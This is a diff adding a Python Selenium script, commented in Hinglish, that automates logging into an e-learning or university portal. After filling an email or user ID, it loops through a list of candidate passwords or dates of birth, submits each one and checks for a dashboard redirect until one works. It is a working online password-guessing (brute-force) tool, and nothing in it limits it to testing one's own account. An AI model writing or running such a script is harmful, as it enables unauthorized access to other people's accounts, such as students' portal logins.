@@ -1,0 +1,204 @@
+import time
+from selenium import webdriver
+from selenium.webdriver.common.by import By
+from selenium.webdriver.common.keys import Keys
+from selenium.webdriver.chrome.service import Service
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
+from webdriver_manager.chrome import ChromeDriverManager
+
+# =========================================================================
+# 👇 WEBSITE URL: Elearning Portal ya Login URL 👇
+# =========================================================================
+portal_url = "dwjgiwiwdi"  # Yahan apna URL check kar lein
+# =========================================================================
+
+# =========================================================================
+# 👇 APNA FUNCTION: Naya Password / DOB dene ke liye 👇
+# =========================================================================
+demo_dobs = ["1111", "0000", "2222", "1234"]  # Example list
+
+def get_next_dob():
+    """Yeh function har bar naya password/DOB return karega."""
+    if demo_dobs:
+        return demo_dobs.pop(0)
+    return None
+
+# =========================================================================
+# 🔀 SWITCH FUNCTION: 'Use password instead' par click karne ke liye
+# =========================================================================
+def switch_to_password(driver):
+    """
+    Website khulte hi 'Use password instead' par click karke
+    Password mode me switch karta hai.
+    """
+    selectors = [
+        "//a[contains(translate(text(), 'USE PASSWORD INSTEAD', 'use password instead'), 'use password instead')]",
+        "//button[contains(translate(text(), 'USE PASSWORD INSTEAD', 'use password instead'), 'use password instead')]",
+        "//*[contains(text(), 'Use password instead') or contains(text(), 'password instead')]",
+        "//a[contains(@href, 'password') or contains(@class, 'password')]"
+    ]
+    for sel in selectors:
+        try:
+            elements = driver.find_elements(By.XPATH, sel)
+            for el in elements:
+                if el.is_displayed():
+                    driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", el)
+                    time.sleep(0.3)
+                    driver.execute_script("arguments[0].click();", el)
+                    print("🎯 'Use password instead' par click karke switch kar diya!")
+                    return True
+        except Exception:
+            continue
+    return False
+
+# =========================================================================
+# 🛡️ HELPER FUNCTION: Sign In / Submit click ke liye
+# =========================================================================
+def click_login(driver):
+    """'Sign in' / 'Login' button dabata hai"""
+    selectors = [
+        "//button[@type='submit']",
+        "//button[contains(translate(text(), 'SIGN IN', 'sign in'), 'sign in')]",
+        "//button[contains(translate(text(), 'LOGIN', 'login'), 'login')]",
+        "//input[@type='submit']"
+    ]
+    for sel in selectors:
+        try:
+            for b in driver.find_elements(By.XPATH, sel):
+                if b.is_displayed():
+                    driver.execute_script("arguments[0].click();", b)
+                    return True
+        except Exception:
+            pass
+    return False
+
+# =========================================================================
+# INPUT CREDENTIALS
+# =========================================================================
+email_or_user = input("Apna Email / User ID daalein: ").strip()
+dob = input("Apna Password / DOB daalein: ").strip()
+
+options = webdriver.ChromeOptions()
+options.add_argument("--start-maximized")
+driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
+
+def check_login_status(driver, timeout=2.0):
+    start_time = time.time()
+    while time.time() - start_time < timeout:
+        # 1. Alert check
+        try:
+            alert = driver.switch_to.alert
+            alert_text = alert.text
+            alert.accept()
+            return False, alert_text
+        except Exception:
+            pass
+
+        # 2. On-page error check (Wrong password)
+        error_selectors = [
+            "//span[contains(@class, 'error') or contains(@id, 'error')]",
+            "//div[contains(@class, 'alert-danger') or contains(@class, 'error') or contains(@role, 'alert')]"
+        ]
+        for sel in error_selectors:
+            try:
+                for el in driver.find_elements(By.XPATH, sel):
+                    if el.is_displayed() and el.text.strip():
+                        return False, el.text.strip()
+            except Exception:
+                pass
+
+        # 3. Dashboard / Redirect check
+        curr_url = driver.current_url.lower()
+        if any(k in curr_url for k in ["dashboard", "home", "default", "my", "course"]):
+            return True, "Dashboard detected"
+
+        time.sleep(0.08)
+
+    return False, "Login abhi nahi hua"
+
+try:
+    print(f"\nWebsite open ho rahi hai: {portal_url}")
+    driver.get(portal_url)
+    wait = WebDriverWait(driver, 10)
+    time.sleep(1.5)
+
+    # -------------------------------------------------------------
+    # ⚡ STEP 1: 'USE PASSWORD INSTEAD' PAR INSTANT SWITCH KARNA
+    # -------------------------------------------------------------
+    switch_to_password(driver)
+    time.sleep(1)
+
+    # -------------------------------------------------------------
+    # ⚡ STEP 2: EMAIL / USERNAME FILL KARNA
+    # -------------------------------------------------------------
+    email_field = None
+    try:
+        email_field = wait.until(EC.visibility_of_element_located((
+            By.XPATH, "//input[@type='email' or @type='text' or contains(@placeholder, 'university.edu') or contains(@name, 'email') or contains(@id, 'email')][1]"
+        )))
+        email_field.clear()
+        email_field.send_keys(email_or_user)
+        print(f"👉 Email/User fill kiya: {email_or_user}")
+    except Exception as e:
+        print(f"⚠️ Email field dhundhne me error: {e}")
+
+    # -------------------------------------------------------------
+    # ⚡ STEP 3: PASSWORD FIELD LOCATE KARNA
+    # -------------------------------------------------------------
+    pwd_field = None
+    try:
+        pwd_field = wait.until(EC.visibility_of_element_located((
+            By.XPATH, "//input[@type='password' or contains(@name, 'password') or contains(@id, 'password')][1]"
+        )))
+    except Exception:
+        # Agar password field abhi nahi aayi toh ek bar fir switch click kare ya Tab dabaye
+        switch_to_password(driver)
+        time.sleep(0.5)
+        if email_field:
+            email_field.send_keys(Keys.TAB)
+            pwd_field = driver.switch_to.active_element
+
+    # -------------------------------------------------------------
+    # ⚡ STEP 4: FAST RETRY LOOP (Password Fill & Sign in)
+    # -------------------------------------------------------------
+    while True:
+        # Password enter karein
+        try:
+            pwd_field.send_keys(Keys.COMMAND + "a")
+            pwd_field.send_keys(Keys.CONTROL + "a")
+            pwd_field.send_keys(Keys.BACKSPACE)
+            pwd_field.send_keys(dob)
+        except Exception:
+            # Agar element stale ho toh dobara locate karein
+            pwd_field = driver.find_element(By.XPATH, "//input[@type='password'][1]")
+            pwd_field.send_keys(Keys.CONTROL + "a", Keys.BACKSPACE)
+            pwd_field.send_keys(dob)
+
+        print(f"👉 Password fill kiya: {dob}")
+
+        # Sign In button click
+        click_login(driver)
+
+        # Status check
+        is_success, msg = check_login_status(driver)
+        if is_success:
+            print("\n" + "=" * 50)
+            print(f"🎉 SUCCESS! Sahi Password mila ({dob}), Login ho gaya!")
+            print("=" * 50)
+            break
+        else:
+            print(f"❌ Galat Password: {dob}")
+            RETRY_DOB = get_next_dob()
+            if not RETRY_DOB:
+                print("Khatam: get_next_dob() ne koi Password nahi diya.")
+                break
+            dob = str(RETRY_DOB).strip()
+
+except Exception as e:
+    print(f"\nError: {e}")
+
+finally:
+    print("\nBrowser band karne ke liye Enter dabayein...")
+    input()
+    driver.quit()
